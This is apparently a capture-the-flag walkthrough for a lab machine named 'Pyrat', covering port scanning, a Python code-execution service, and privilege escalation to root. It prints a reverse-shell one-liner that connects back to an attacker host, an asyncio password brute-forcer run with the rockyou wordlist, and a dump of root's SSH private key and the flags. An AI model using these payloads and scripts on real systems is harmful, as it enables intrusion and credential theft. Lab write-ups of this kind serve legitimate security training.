# Pyrat

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.93:22
Open 10.0.2.93:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.93
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMc4hLykriw3nBOsKHJK1Y6eauB8OllfLLlztbB4tu4c9cO8qyOXSfZaCcb92uq/Y3u02PPHWq2yXOLPler1AFGVhuSfIpokEnT2jgQzKL63uJMZtoFzL3RW8DAzunrHhi/nQqo8sw7wDCiIN9s4PDrAXmP6YXQ5ekK30om9kd5jHG6xJ+/gIThU4ODr/pHAqr28bSpuHQdgphSjmeShDMg8wu8Kk/B0bL2oEvVxaNNWYWc1qHzdgjV5HPtq6z3MEsLYzSiwxcjDJ+EnL564tJqej6R69mjII1uHStkrmewzpiYTBRdgi9A3Yb+x8NxervECFhUR2MoR1zD+0UJbRA2v1LQaGg9oYnYXNq3Lc5c4aXz638wAUtLtw2SwTvPxDrlCmDVtUhQFDhyFOu9bSmPY0oGH5To8niazWcTsCZlx2tpQLhF/gS3jP/fVw+H6Eyz/yge3RYeyTv3ehV6vXHAGuQLvkqhT6QS21PLzvM7bCqmo1YIqHfT2DLi7jZxdk=
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJNL/iO8JI5DrcvPDFlmqtX/lzemir7W+WegC7hpoYpkPES6q+0/p4B2CgDD0Xr1AgUmLkUhe2+mIJ9odtlWW30=
|   256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFG/Wi4PUTjReEdk2K4aFMi8WzesipJ0bp0iI0FM8AfE
8000/tcp open  http-alt syn-ack SimpleHTTP/0.6 Python/3.11.2
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LANDesk-RC, Socks4, X11Probe: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|     name 'HELP' is not defined
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (8080)

```bash
└─$ curl 10.0.2.93:8000 -i
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Sat Nov 22 17:39:10  2025
Content-type: text/html; charset=utf-8
Content-Length: 27

Try a more basic connection 
```

### Python Repl

```bash
└─$ nc 10.0.2.93 8000
HELLO
name 'HELLO' is not defined
uwu
print("HELLO")
HELLO
```

### Reverse Shell

```bash
# Send
__import__("os").system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'")
---
└─$ listen
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.93:48652.
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

There's a project in `/opt`
```bash
www-data@Pyrat:/tmp$ cp /opt/dev /tmp -r
www-data@Pyrat:/tmp$ cd /tmp/dev
www-data@Pyrat:/tmp/dev$ git checkout .
git checkout .
warning: unable to access '/root/.config/git/attributes': Permission denied
Updated 1 path from the index
www-data@Pyrat:/tmp/dev$ ls -alh
ls -alh
total 16K
drwxr-xr-x  3 www-data www-data 4.0K Nov 22 17:48 .
drwxrwxrwt 13 root     root     4.0K Nov 22 17:48 ..
drwxr-xr-x  8 www-data www-data 4.0K Nov 22 17:48 .git
-rw-r--r--  1 www-data www-data  753 Nov 22 17:48 pyrat.py.old
www-data@Pyrat:/tmp/dev$ cat pyrat.py.old
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

We can only see part of source code and it's old.

There's a mail for user.
```bash
www-data@Pyrat:/var/mail$ ss -tunlp4
Netid State  Recv-Q  Send-Q      Local Address:Port   Peer Address:Port Process
udp   UNCONN 0       0           127.0.0.53%lo:53          0.0.0.0:*
udp   UNCONN 0       0        10.0.2.93%enp0s3:68          0.0.0.0:*
tcp   LISTEN 0       4096        127.0.0.53%lo:53          0.0.0.0:*
tcp   LISTEN 0       128               0.0.0.0:22          0.0.0.0:*
tcp   LISTEN 0       100             127.0.0.1:25          0.0.0.0:* # <---
tcp   LISTEN 0       5                 0.0.0.0:8000        0.0.0.0:*

www-data@Pyrat:/var/mail$ cat think
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0) id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

- **[PyRAT](https://github.com/josemlwdf/PyRAT)**

Bruteforce password
```python
import asyncio

HOST = '10.0.2.93'
PORT = 8000

found = False
found_password = None
password_queue = asyncio.Queue(maxsize=1000)

async def get_socket():
    reader, writer = await asyncio.open_connection(HOST, PORT)
    writer.write(b'admin\n')
    await writer.drain()
    await reader.readline()
    return reader, writer

async def brute_force_worker(worker_id):
    global found, found_password
    reader, writer = await get_socket()
    print(f"[Worker {worker_id}] Connected")
    
    attempt = 1
    while not found:
        password = await password_queue.get()
        
        if password is None:
            break
        
        writer.write(password.encode() + b'\n')
        await writer.drain()
        resp = await reader.readline()
        resp = resp.decode().strip()
        
        print(f"[Worker {worker_id}] {password.strip():20s} → {resp}")
        
        if 'Welcome' in resp:
            print(f"✓ [Worker {worker_id}] SUCCESS! Password: {password.strip()}")
            found = True
            found_password = password.strip()
            writer.close()
            await writer.wait_closed()
            break
        
        attempt += 1
        if attempt >= 3:
            # print(f"[Worker {worker_id}] Reconnecting...")
            writer.close()
            await writer.wait_closed()
            reader, writer = await get_socket()
            attempt = 1
    
    writer.close()
    await writer.wait_closed()

async def password_feeder(wordlist):
    with open(wordlist, 'r', encoding='latin-1') as f:
        count = 0
        for line in f:
            if found: break
            password = line.strip()
            if password:
                await password_queue.put(password)
                count += 1
                if count % 100000 == 0:
                    qsize = password_queue.qsize()
                    print(f"Queued {count} passwords (queue: {qsize})")
    
    print(f"Total: {count} passwords loaded")

async def main():
    wordlist = '/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'
    num_workers = 10
    
    feeder_task = asyncio.create_task(password_feeder(wordlist))
    worker_tasks = [asyncio.create_task(brute_force_worker(i)) for i in range(num_workers)]
    
    await feeder_task
    
    for _ in range(num_workers):
        await password_queue.put(None)
    
    await asyncio.gather(*worker_tasks)
    
    if found:
        print(f"✓ Password found: {found_password}")
    else:
        print("✗ Password not found")

if __name__ == "__main__":
    asyncio.run(main())
```

```bash
...
[Worker 7] Reconnecting...
[Worker 5] batman               → Password:
[Worker 5] september            → Welcome Admin!!! Type "shell" to begin
✓ [Worker 5] SUCCESS! Password: september
```

```bash
└─$ nc 10.0.2.93 8000
admin
Password:
september
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## Flags

```bash
# cat /home/think/user.txt
996bdb1f619a68361417cabca5454705
# cat /root/root.txt
ba5ed03e9e74bb98054438480165e221
```

